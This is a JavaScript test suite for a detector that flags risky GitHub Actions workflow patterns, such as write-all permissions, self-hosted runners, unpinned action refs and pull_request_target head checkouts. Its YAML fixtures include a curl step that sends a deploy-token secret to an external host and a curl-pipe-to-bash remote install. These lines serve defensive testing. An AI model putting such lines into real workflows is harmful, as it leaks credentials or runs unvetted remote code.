import test from 'node:test';
import assert from 'node:assert/strict';
import { detectWorkflowStructure } from '../dist/detectors/workflow-structure.js';

function addedAll(file, content) {
  // Treat every line as added so structural findings whose YAML span overlaps
  // the source fire.
  const lines = content.split(/\r?\n/);
  return lines.map((text, index) => ({ file, line: index + 1, content: text }));
}

test('structural: workflow-level permissions: write-all fires the workflow-level kind', () => {
  const wf = `name: pr-check
on:
  pull_request:
permissions: write-all
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - run: echo ok
`;
  const findings = detectWorkflowStructure(addedAll('.github/workflows/pr.yml', wf), {
    '.github/workflows/pr.yml': wf
  });
  const f = findings.find((finding) => finding.kind === 'capability_echo.workflow_workflow_level_write_permission');
  assert.ok(f, 'workflow-level write permission should fire');
  assert.equal(f.line, 4);
});

test('structural: job-level permissions: contents: write fires the per-job kind, not the workflow-level one', () => {
  const wf = `name: pr-check
on:
  pull_request:
jobs:
  a:
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
      - run: echo ok
`;
  const findings = detectWorkflowStructure(addedAll('.github/workflows/pr.yml', wf), {
    '.github/workflows/pr.yml': wf
  });
  const workflowLevel = findings.find(
    (finding) => finding.kind === 'capability_echo.workflow_workflow_level_write_permission'
  );
  assert.equal(workflowLevel, undefined, 'workflow-level kind should NOT fire for job-level perms');
  const jobLevel = findings.find((finding) => finding.kind === 'capability_echo.workflow_permission_write');
  assert.ok(jobLevel);
  assert.match(jobLevel.subject, /job a/);
});

test('structural: step env secret combined with external curl fires secret_exfil_pattern with the correct line', () => {
  const wf = `name: deploy
on:
  push:
jobs:
  d:
    runs-on: ubuntu-latest
    steps:
      - name: ship
        run: 'curl https://api.example.com/hook -H "Authorization: Bearer $T"'
        env:
          T: \${{ secrets.DEPLOY_TOKEN }}
`;
  const findings = detectWorkflowStructure(addedAll('.github/workflows/deploy.yml', wf), {
    '.github/workflows/deploy.yml': wf
  });
  const f = findings.find((finding) => finding.kind === 'capability_echo.workflow_secret_exfil_pattern');
  assert.ok(f);
  assert.match(f.subject, /\(d\)/);
});

test('structural: external pipe-to-shell without secrets is not secret exfiltration', () => {
  const wf = `name: install
on:
  push:
jobs:
  d:
    runs-on: ubuntu-latest
    steps:
      - run: curl https://install.example.com/bootstrap.sh | bash
`;
  const findings = detectWorkflowStructure(addedAll('.github/workflows/install.yml', wf), {
    '.github/workflows/install.yml': wf
  });
  assert.equal(
    findings.find((finding) => finding.kind === 'capability_echo.workflow_secret_exfil_pattern'),
    undefined
  );
});

test('structural: a commented `# permissions: write-all` does NOT fire', () => {
  const wf = `name: pr-check
on:
  pull_request:
# permissions: write-all
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - run: echo ok
`;
  const findings = detectWorkflowStructure(addedAll('.github/workflows/pr.yml', wf), {
    '.github/workflows/pr.yml': wf
  });
  assert.equal(
    findings.find((finding) => finding.kind === 'capability_echo.workflow_workflow_level_write_permission'),
    undefined
  );
});

test('structural: self-hosted runner in a sequence value fires per job', () => {
  const wf = `name: build
on:
  push:
jobs:
  build:
    runs-on: [self-hosted, linux]
    steps:
      - run: make
`;
  const findings = detectWorkflowStructure(addedAll('.github/workflows/build.yml', wf), {
    '.github/workflows/build.yml': wf
  });
  const f = findings.find((finding) => finding.kind === 'capability_echo.workflow_self_hosted_runner');
  assert.ok(f);
  assert.match(f.message, /Job "build"/);
});

test('structural: mutable action ref fires for non-SHA remote action refs', () => {
  const wf = `name: checkout
on:
  push:
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@main
      - uses: actions/checkout@v6
`;
  const findings = detectWorkflowStructure(addedAll('.github/workflows/co.yml', wf), {
    '.github/workflows/co.yml': wf
  });
  const findings_mut = findings.filter((finding) => finding.kind === 'capability_echo.workflow_mutable_action_ref');
  assert.equal(findings_mut.length, 2, '@main and @v6 should both be mutable remote refs');
  assert.ok(findings_mut.some((finding) => /actions\/checkout@main/.test(finding.message)));
  assert.ok(findings_mut.some((finding) => /actions\/checkout@v6/.test(finding.message)));
});

test('structural: PR head checkout under pull_request_target fires per step', () => {
  const wf = `name: pr-audit
on:
  pull_request_target:
jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6
        with:
          ref: \${{ github.event.pull_request.head.sha }}
      - run: npm install
`;
  const findings = detectWorkflowStructure(addedAll('.github/workflows/audit.yml', wf), {
    '.github/workflows/audit.yml': wf
  });
  const f = findings.find(
    (finding) => finding.kind === 'capability_echo.workflow_pr_head_checkout_on_target'
  );
  assert.ok(f);
});

test('structural: secrets: inherit fires per job', () => {
  const wf = `name: reuse
on:
  push:
jobs:
  call:
    uses: org/repo/.github/workflows/wf.yml@main
    secrets: inherit
`;
  const findings = detectWorkflowStructure(addedAll('.github/workflows/r.yml', wf), {
    '.github/workflows/r.yml': wf
  });
  assert.ok(findings.find((finding) => finding.kind === 'capability_echo.workflow_secrets_inherit'));
});

test('structural: findings outside the added-line set are dropped', () => {
  const wf = `name: build
on:
  push:
jobs:
  a:
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
      - run: echo ok
`;
  // No added lines at all — purely "unchanged file" view should emit nothing.
  const findings = detectWorkflowStructure([], { '.github/workflows/b.yml': wf });
  assert.equal(findings.length, 0);
});
